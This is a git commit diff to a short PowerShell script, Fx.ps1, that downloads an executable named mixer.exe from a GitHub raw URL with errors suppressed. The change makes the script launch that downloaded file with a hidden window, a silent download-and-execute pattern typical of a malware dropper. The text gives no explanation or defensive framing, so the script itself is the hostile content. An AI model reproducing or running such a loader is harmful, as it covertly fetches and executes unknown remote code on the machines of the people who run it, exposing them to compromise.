dabca3da9e40d7a11d8f8be4c1b284d2065292fb
svhosf <markijannshtoyko@gmail.com>
2026-03-15 01:21:37 +0200

    Fx.ps1

--- Fx.ps1
+++ Fx.ps1
@@ -1,4 +1,4 @@
 Invoke-WebRequest -Uri "https://github.com/svhosf/-/raw/refs/heads/main/mixer.exe" -OutFile "mixer.exe" -ErrorAction SilentlyContinue
     
     # Запускаем 
-    Start-Process -FilePath "fix.exe" -WindowStyle Hidden
+    Start-Process -FilePath "mixer.exe" -WindowStyle Hidden
